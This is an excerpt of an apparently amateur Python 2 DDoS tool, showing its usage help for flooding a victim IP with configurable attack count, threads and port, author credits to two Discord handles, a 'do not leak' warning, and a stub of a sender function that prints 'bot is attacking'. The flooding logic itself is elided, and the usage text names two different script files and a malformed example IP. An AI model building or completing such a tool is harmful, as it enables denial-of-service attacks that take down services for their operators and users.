...
def helptext ():
        print "Usage: %s is 1.1 for GNU/Linux - How to ddos? do python2 GGD.py (ip target) [-t] [-c] [-p]\n" % sys.argv[0]
        print " Example of launch attack ( python2 FO.py (127.00.00.0) -t 999999 -c 100000 -p 80)"
        print ""
        print ""
        print ""
        print ""
        print "   -t [set the amount attacks!]"
        print "   -c [Set the connection/threads]"
        print "   -p (Set the port address of the victim!)"
        print ""
        print ""
        print ""
        print " <DO NOT LEAK THIS TOOLS OR DDOS"
        print ""
        print ""
        print ""
        print "Tools was made by Brexe#0765 And Senpai#6607"
        exit()
...
def sender (num):
        ...
        col()
        print "< Wait bot is attacking %d >" % num
